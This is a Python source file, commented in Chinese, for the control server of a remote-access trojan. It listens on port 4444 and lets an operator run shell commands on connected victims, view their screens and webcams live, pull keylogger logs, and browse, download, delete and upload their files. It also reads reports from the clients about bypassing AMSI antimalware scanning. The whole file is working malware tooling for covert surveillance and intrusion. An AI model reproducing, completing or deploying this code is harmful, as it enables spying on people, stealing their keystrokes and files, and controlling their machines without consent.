"""
===============================================================================
  远程管理后台（服务端）
  功能：接收客户端连接，远程执行 Shell、屏幕监控、摄像头监控、文件管理、键盘记录等操作
  用法:python 后台.py
  说明：
    - 监听 0.0.0.0:4444,等待客户端主动连接
    - 客户端连接后，通过菜单选择要执行的操作
    - 支持同时管理多个客户端（多线程接收连接）
===============================================================================
"""

import socket
import threading
import cv2
import os
import numpy as np
import pickle
import tkinter
from tkinter import filedialog
import queue
# ============================================================================
# 第一部分：服务端初始化
# ============================================================================

# 绑定的 IP 和端口（0.0.0.0 表示监听本机所有网卡）
HOST = '0.0.0.0'
PORT = 4444

# 创建 TCP 套接字
backend = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 允许端口复用 —— 重启服务器时不会因为端口未释放而报错
backend.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# 绑定地址并开始监听（最多 10 个等待连接）
backend.bind((HOST, PORT))
backend.listen(10)
print(f"[*] 服务器正在监听 {HOST}:{PORT} ...")

# --------------------------------------------------------------------------
# 全局数据结构
# --------------------------------------------------------------------------
# client_list: 存储已连接的客户端，每个元素是 (socket对象, 地址元组)
client_list = []
# list_lock: 线程锁，保证多线程安全地读写 client_list
list_lock = threading.Lock()


# ============================================================================
# 第二部分：后台线程 —— 持续接收新客户端连接
# ============================================================================

def accept_clients():
    """
    在后台线程中循环运行，负责：
      1. 调用 accept() 阻塞等待新客户端
      2. 将新客户端加入 client_list
    """
    while True:
        try:
            # 阻塞等待客户端连接
            client, addr = backend.accept()
            # 放入消息队列，由主线程在菜单循环中统一打印，避免干扰 input()
            pending_messages.put(f"[+] 新客户端已连接：{addr}")
            # 加锁后添加到全局列表，保证线程安全
            with list_lock:
                # 同 IP 去重：如果该 IP 已有旧连接，关闭并替换，防止重连累积
                for i, (old_cli, old_addr) in enumerate(client_list):
                    if old_addr[0] == addr[0]:
                        try:
                            old_cli.close()
                        except Exception:
                            pass
                        pending_messages.put(f"[-] 客户端 {old_addr} 被新连接替换")
                        client_list.pop(i)
                        break
                client_list.append((client, addr))
        except Exception:
            # accept 出错（如 socket 被关闭），退出循环
            break

# 线程安全消息队列：后台线程将连接消息放入队列，主线程在菜单循环中统一打印
pending_messages = queue.Queue()

# 记录已消耗过 AMSI 数据的客户端 socket id，list 预读后操作时跳过
amsi_consumed = set()
amsi_consumed_lock = threading.Lock()

# 启动后台接收线程（daemon=True 表示主线程退出时自动结束）
threading.Thread(target=accept_clients, daemon=True).start()


# ============================================================================
# 第三部分：工具函数
# ============================================================================

def cleanup_dead_clients():
    """
    检测并移除 client_list 中已断开的客户端。
    使用 MSG_PEEK 非阻塞探测，不消费缓冲区数据。
    清理时通过 pending_messages 通知主线程在菜单循环中统一打印。
    """
    with list_lock:
        alive = []
        for cli, addr in client_list:
            try:
                cli.settimeout(0)
                # MSG_PEEK 窥看 1 字节但不消费，用于检测 socket 存活
                peek = cli.recv(1, socket.MSG_PEEK)
                if peek == b'':
                    # recv 返回空字节 = 对方已关闭
                    raise ConnectionError("客户端已断开")
                cli.settimeout(None)
                alive.append((cli, addr))
            except socket.timeout:
                # 超时 = socket 存活但无数据，是正常状态
                cli.settimeout(None)
                alive.append((cli, addr))
            except BlockingIOError:
                # 非阻塞下无数据可读 = 存活
                cli.settimeout(None)
                alive.append((cli, addr))
            except (ConnectionError, OSError):
                # 连接已断开，关闭并丢弃
                try:
                    cli.close()
                except Exception:
                    pass
                pending_messages.put(f"[-] 客户端 {addr} 已断开，已自动移除")
        # 用切片赋值原地替换列表
        client_list[:] = alive


def try_consume_amsi(cli, addr):
    """
    尝试从客户端读取 AMSI 状态消息。
    如果读到非空数据，打印并发送 ACK，返回 True。
    如果超时（无 AMSI 数据），返回 False。
    已消费的客户端会记录到 amsi_consumed，避免重复消费。
    """
    with amsi_consumed_lock:
        if id(cli) in amsi_consumed:
            return True  # 之前已消费过，跳过
    cli.settimeout(0.3)
    try:
        data = cli.recv(4096)
        text = data.decode(errors='ignore').strip()
        if text:
            print(f"[{addr}] AMSI: {text}")
            cli.sendall(b'ACK')
            with amsi_consumed_lock:
                amsi_consumed.add(id(cli))
            return True
    except socket.timeout:
        pass
    except OSError:
        pass
    finally:
        cli.settimeout(None)
    return False


def recv_exact(sock, length):
    """
    从 socket 精确接收 length 字节的数据。
    因为 TCP 是流式协议，一次 recv 不一定能收满指定长度，
    所以需要循环接收直到收满为止。
    
    参数:
        sock   : socket 对象
        length : 需要接收的字节数
    
    返回:
        接收到的 bytes 数据
    
    异常:
        连接断开时抛出 ConnectionError
    """
    data = b''
    while len(data) < length:
        # 每次最多收 length - 已收 字节，避免多收
        chunk = sock.recv(length - len(data))
        if not chunk:
            # recv 返回空字节表示对方已断开连接
            raise ConnectionError("客户端断开连接")
        data += chunk
    return data


# ============================================================================
# 第四部分：功能模块
# ============================================================================

def handle_keylog(target_client, addr):
    """模块5：远程键盘记录"""
    target_client.send(b'5')
    # 按协议：先收8字节长度头，再收实际数据
    len_data = recv_exact(target_client, 8)
    log_len = int(len_data.decode())
    log_data = recv_exact(target_client, log_len).decode('utf-8', errors='ignore')
    print(f"{addr} 的键盘记录：\n{log_data}")

def handle_file(target_client, addr):
    """模块4：远程文件管理"""
    target_client.send(b'4')
    # 先读取 8 字节长度头，再读取实际的磁盘信息数据
    len_data = recv_exact(target_client, 8)
    hd_len = int(len_data.decode())
    recv_HD = recv_exact(target_client, hd_len).decode(errors='ignore')
    print(f"{addr}的磁盘信息：{recv_HD}")
    path = ''  # 当前浏览路径，必须先 to 导航
    print("提示：请先使用 to <盘符> 导航到目标磁盘，例如 to C:")
    while True:
        sinter = input("File> ").strip()
        if not sinter:
            continue
        if sinter == '0':
            target_client.send(b'0')
            break
        parts = sinter.split(maxsplit=2)
        cmd = parts[0]

        if cmd == 'to':
            # 导航: to C:  或  to Program Files (x86)
            if len(parts) < 2:
                print("[-] 格式：to <盘符/目录名> [子目录...]")
                continue
            first = parts[1]
            if len(first) == 2 and first[1] == ':':
                # 盘符模式: to C: Windows System32 → C:\Windows\System32\
                path = first + '\\'
                if len(parts) >= 3:
                    path += '\\'.join(parts[2:]) + '\\'
            else:
                # 目录名模式: to Program Files (x86) → 保留空格
                dirname = ' '.join(parts[1:]).strip('\'"')
                path = (path or '') + dirname + '\\'
            # 导航后自动列出目录
            target_client.send(f"look {path}".encode())
            len_data = recv_exact(target_client, 8)
            data_len = int(len_data.decode())
            data = recv_exact(target_client, data_len)
            try:
                files = pickle.loads(data)
                print(f"[{addr}] {path} 目录内容：{files}")
            except Exception:
                print(f"[{addr}] {path} 目录内容：{data.decode(errors='ignore')}")
            print(f"当前路径：{path}")

        elif cmd == 'back':
            # 返回上级目录
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            path = path.rstrip('\\')
            if '\\' in path:
                path = path[:path.rfind('\\')] + '\\'
            target_client.send(f"look {path}".encode())
            len_data = recv_exact(target_client, 8)
            data_len = int(len_data.decode())
            data = recv_exact(target_client, data_len)
            try:
                files = pickle.loads(data)
                print(f"[{addr}] {path} 目录内容：{files}")
            except Exception:
                print(f"[{addr}] {path} 目录内容：{data.decode(errors='ignore')}")
            print(f"当前路径：{path}")

        elif cmd == 'look':
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            # 列出子目录: look subdir
            if len(parts) >= 2:
                look_path = path + ' '.join(parts[1:]).strip('\'"') + '\\'
            else:
                look_path = path
            target_client.send(f"look {look_path}".encode())
            len_data = recv_exact(target_client, 8)
            data_len = int(len_data.decode())
            data = recv_exact(target_client, data_len)
            try:
                files = pickle.loads(data)
                print(f"[{addr}] {look_path} 目录内容：{files}")
            except Exception:
                print(f"[{addr}] {look_path} 目录内容：{data.decode(errors='ignore')}")

        elif cmd == 'get':
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            if len(parts) < 2:
                print("[-] 格式：get <文件名>")
                continue
            file_path = path + ' '.join(parts[1:]).strip('\'"')
            target_client.send(f"get {file_path}".encode())
            # 接收文件大小（-1 表示客户端读取失败）
            file_size = int(recv_exact(target_client, 8).decode())
            if file_size < 0:
                print(f"[-] {addr} 的 {file_path} 文件不存在或无法读取")
                continue
            print(f"[{addr}] {file_path} 文件大小：{file_size} 字节")
            target_client.send(b'ok')
            # 接收并保存文件
            file_data = recv_exact(target_client, file_size)
            local_name = os.path.basename(file_path.strip('\\'))
            with open(local_name, 'wb') as f:
                f.write(file_data)
            print(f"[{addr}] {file_path} 已下载完成，保存为 ./{local_name}")

        elif cmd == 'delete':
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            if len(parts) < 2:
                print("[-] 格式：delete <文件名>")
                continue
            file_path = path + ' '.join(parts[1:]).strip('\'"')
            target_client.send(f"delete {file_path}".encode())
            print(f"[{addr}] {file_path} 已删除")
        elif cmd == 'information':
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            if len(parts) < 2:
                print("[-] 格式：information <文件名>")
                continue
            file_path = path + ' '.join(parts[1:]).strip('\'"')
            target_client.send(f"information {file_path}".encode())
            # 按协议：先收8字节长度头，再收实际数据
            len_data = recv_exact(target_client, 8)
            info_len = int(len_data.decode())
            info_data = recv_exact(target_client, info_len)
            file_information = info_data.decode('gbk', errors='ignore')
            print(f"[{addr}] {file_path} 文件信息：\n{file_information}")
        #发送文件
        elif cmd=='send':
            if not path:
                print("[-] 尚未导航，请先用 to 命令")
                continue
            # 第一步：通知客户端准备接收文件（发送目标目录）
            target_client.send(f"send {path}".encode())
            # 第二步：等待客户端就绪信号
            ready_signal = recv_exact(target_client, 5)
            if ready_signal != b"READY":
                print(f"[-] 客户端未就绪，收到：{ready_signal}")
                continue
            print(f"[{addr}] 客户端已就绪，准备发送文件")
            # 第三步：打开文件选择对话框
            root = tkinter.Tk()
            root.withdraw()
            file_path = filedialog.askopenfilename(title="选择要发送的文件")
            if not file_path:
                print("[!] 未选择文件，已取消")
                target_client.sendall(b"-0000001")  # 8字节通知客户端取消
                continue
            try:
                # 第四步：发送文件名（让客户端拼接完整保存路径）
                filename = os.path.basename(file_path)
                filename_bytes = filename.encode('utf-8')
                target_client.sendall(f"{len(filename_bytes):08d}".encode() + filename_bytes)
                ack = recv_exact(target_client, 2)
                if ack != b"OK":
                    print(f"[-] 客户端未确认文件名，收到：{ack}")
                    continue
                # 第五步：发送文件大小并传输数据
                file_size = os.path.getsize(file_path)
                target_client.sendall(f"{file_size:08d}".encode())
                ack = recv_exact(target_client, 2)
                if ack != b"OK":
                    print(f"[-] 客户端未确认，收到：{ack}")
                    continue
                # 发送文件数据（分块，不带额外长度头）
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(4096)
                        if not chunk:
                            break
                        target_client.sendall(chunk)
                # 接收客户端完成确认
                result = recv_exact(target_client, 7)
                if result == b"SUCCESS":
                    print(f"[{addr}] 文件 {file_path} 已发送到客户端 {path}")
                else:
                    print(f"[-] 客户端报告错误：{result.decode(errors='ignore')}")
            except Exception as e:
                print(f"[-] 发送文件失败：{e}")
        else:
            print("[-] 未知命令，支持：to / back / look / get / delete / information / send /0")

        

def handle_shell(target_client, addr):
    """
    模块1：远程 Shell 命令执行
    
    流程：
      1. 发送模式码 '1' 通知客户端进入 Shell 模式
      2. 循环读取用户输入的命令，发送给客户端
      3. 客户端执行后返回：8字节长度头 + 实际输出数据
      4. 输入 '0' 退出 Shell 模式
    
    参数:
        target_client : 目标客户端的 socket 对象
        addr          : 客户端地址（用于日志显示）
    """
    # 通知客户端进入 Shell 模式
    target_client.send(b'1')
    print(f"[{addr}] 已进入 Shell 模式，输入 0 返回菜单")

    while True:
        # 读取用户输入的命令
        cmd = input("Shell> ").strip()
        if not cmd:
            continue

        # 发送命令给客户端
        target_client.send(cmd.encode())

        # 发送退出指令，结束 Shell 模式
        if cmd == '0':
            break

        # --- 接收客户端返回的命令输出 ---
        # 第1步：接收 8 字节的长度头（不足8位前面补0）
        len_data = recv_exact(target_client, 8)
        out_len = int(len_data.decode().strip())

        # 第2步：根据长度头接收实际的输出数据
        out_data = recv_exact(target_client, out_len)

        # 第3步：解码并打印（客户端使用 gbk 编码）
        print(out_data.decode('gbk', errors='ignore'))


def handle_screen(target_client, addr):
    """
    模块2：远程屏幕监控
    
    流程：
      1. 发送模式码 '2' 通知客户端进入屏幕截图模式
      2. 循环发送 'get' 请求截图，接收 JPEG 图片数据
      3. 使用 OpenCV 在本地窗口实时显示
      4. 按 'q' 键停止监控
    
    参数:
        target_client : 目标客户端的 socket 对象
        addr          : 客户端地址（用于窗口标题和日志）
    """
    # 通知客户端进入屏幕截图模式
    target_client.send(b'2')
    win_name = f"Screen - {addr}"
    print(f"[{addr}] 屏幕监控已启动，按 'q' 键退出")

    # 创建可调整大小的显示窗口
    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)

    while True:
        # 发送 'get' 请求一帧截图
        target_client.send(b'get')

        # --- 接收图片数据 ---
        # 第1步：接收 8 字节的长度头
        len_buf = recv_exact(target_client, 8)
        img_size = int(len_buf.decode().strip())

        # 第2步：接收完整的 JPEG 图片数据
        img_data = recv_exact(target_client, img_size)

        # --- 在内存中解码并显示 ---
        if img_size > 0:
            # 将 bytes 转为 numpy 数组
            nparr = np.frombuffer(img_data, np.uint8)
            # 解码 JPEG 为 OpenCV 图像
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                cv2.imshow(win_name, img)

        # 等待 30 毫秒，检测是否按下 'q' 键
        if cv2.waitKey(30) & 0xFF == ord('q'):
            # 通知客户端停止截图
            target_client.send(b'stop')
            break

    # 关闭显示窗口
    cv2.destroyWindow(win_name)
    print(f"[{addr}] 屏幕监控已停止")


def handle_camera(target_client, addr):
    """
    模块3：远程摄像头监控
    
    流程（与屏幕监控类似）：
      1. 发送模式码 '3' 通知客户端进入摄像头模式
      2. 循环发送 'get' 请求摄像头帧，接收 JPEG 图片数据
      3. 使用 OpenCV 在本地窗口实时显示
      4. 按 'q' 键停止监控
    
    参数:
        target_client : 目标客户端的 socket 对象
        addr          : 客户端地址（用于窗口标题和日志）
    """
    # 通知客户端进入摄像头模式
    target_client.send(b'3')
    win_name = f"Camera - {addr}"
    print(f"[{addr}] 摄像头监控已启动，按 'q' 键退出")

    # 创建可调整大小的显示窗口
    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)

    while True:
        # 发送 'get' 请求一帧摄像头画面
        target_client.send(b'get')

        # --- 接收图片数据 ---
        # 第1步：接收 8 字节的长度头
        len_buf = recv_exact(target_client, 8)
        img_size = int(len_buf.decode().strip())

        # 第2步：接收完整的 JPEG 图片数据
        img_data = recv_exact(target_client, img_size)

        # --- 在内存中解码并显示 ---
        if img_size > 0:
            nparr = np.frombuffer(img_data, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                cv2.imshow(win_name, img)

        # 等待 30 毫秒，检测是否按下 'q' 键
        if cv2.waitKey(30) & 0xFF == ord('q'):
            target_client.send(b'stop')
            break

    # 关闭显示窗口
    cv2.destroyWindow(win_name)
    print(f"[{addr}] 摄像头监控已停止")


# ============================================================================
# 第五部分：管理菜单 —— 主控制台
# ============================================================================

def admin_console():
    """
    管理员交互控制台。
    提供菜单让用户选择操作：列出客户端、Shell、屏幕监控、摄像头监控、键盘记录。
    """
    while True:
        # --- 清理已断开的客户端 ---
        cleanup_dead_clients()

        # --- 打印后台线程积累的待处理消息（避免干扰 input()） ---
        try:
            while True:
                msg = pending_messages.get_nowait()
                print(msg)
        except queue.Empty:
            pass

        # --- 显示菜单 ---
        print("\n" + "=" * 50)
        print("              远程管理控制台")
        print("=" * 50)
        print("  list             - 列出所有在线客户端")
        print("  shell   <编号>   - 向指定客户端发送 Shell 命令")
        print("  screen  <编号>   - 开始监控指定客户端的屏幕")
        print("  camera  <编号>   - 打开指定客户端的摄像头")
        print("  file    <编号>   - 浏览指定客户端的文件系统")
        print("  keylog  <编号>   - 获取指定客户端的键盘记录")
        print("  quit             - 退出管理程序")
        print("=" * 50)

        # 读取用户命令
        cmd_input = input("请输入命令：").strip()
        if not cmd_input:
            continue

        # 将输入拆分为命令 + 参数（例如 "shell 1" → ["shell", "1"]）
        parts = cmd_input.split()
        base_cmd = parts[0]

        # --- 执行命令前再消耗一次消息队列，把 input() 等待期间积压的消息先打印出来 ---
        try:
            while True:
                msg = pending_messages.get_nowait()
                print(msg)
        except queue.Empty:
            pass

        # ================================================================
        # 命令：list —— 列出所有已连接的客户端
        # ================================================================
        if base_cmd == 'list':
            with list_lock:
                if not client_list:
                    print("[!] 当前没有在线客户端")
                else:
                    print(f"\n在线客户端（共 {len(client_list)} 个）：")
                    for i, (cli, addr) in enumerate(client_list):
                        print(f"  [{i + 1}] {addr}")
                        # 顺便读取 AMSI 状态（不阻塞列表显示）
                        try_consume_amsi(cli, addr)

        # ================================================================
        # 命令：shell / screen / camera
        # ================================================================
        elif base_cmd in ['shell', 'screen', 'camera', 'file', 'keylog']:
            # 校验参数格式：必须带一个数字编号
            if len(parts) != 2 or not parts[1].isdigit():
                print(f"[-] 格式错误！正确用法：{base_cmd} <编号>")
                print(f"    示例：{base_cmd} 1")
                continue

            # 将用户输入的编号转为列表索引（用户看到的是从 1 开始）
            idx = int(parts[1]) - 1

            # 检查编号是否有效
            with list_lock:
                if idx < 0 or idx >= len(client_list):
                    print(f"[-] 无效的客户端编号！请先用 list 查看在线客户端")
                    continue
                # 获取目标客户端的 socket 和地址
                target_client, addr = client_list[idx]

            # ============================================================
            # 消耗客户端连接时发送的 AMSI 绕过结果，防止干扰后续协议解析
            # ============================================================
            try_consume_amsi(target_client, addr)

            # 根据命令分发到对应的处理函数
            try:
                if base_cmd == 'shell':
                    handle_shell(target_client, addr)

                elif base_cmd == 'screen':
                    handle_screen(target_client, addr)

                elif base_cmd == 'camera':
                    handle_camera(target_client, addr)

                elif base_cmd == 'file':
                    handle_file(target_client, addr)

                elif base_cmd == 'keylog':
                    handle_keylog(target_client, addr)

            except (ConnectionError, ConnectionResetError, OSError) as e:
                # 通信异常：客户端可能已断开
                print(f"[-] 与 {addr} 的通信中断：{e}")
                # 清理所有可能残留的 OpenCV 窗口
                cv2.destroyAllWindows()
                # 从客户端列表中移除
                with list_lock:
                    if (target_client, addr) in client_list:
                        client_list.remove((target_client, addr))
                        print(f"[!] {addr} 已从在线列表中移除")

        # ================================================================
        # 命令：quit —— 退出程序
        # ================================================================
        elif base_cmd == 'quit':
            print("[*] 正在退出管理程序...")
            break

        # ================================================================
        # 未知命令
        # ================================================================
        else:
            print(f"[-] 未知命令：{base_cmd}，请输入有效命令")


# ============================================================================
# 第六部分：程序入口
# ============================================================================

if __name__ == '__main__':
    try:
        # 启动管理控制台
        admin_console()
    finally:
        # 无论是否异常退出，都关闭服务端 socket
        backend.close()
        print("[*] 服务器已关闭")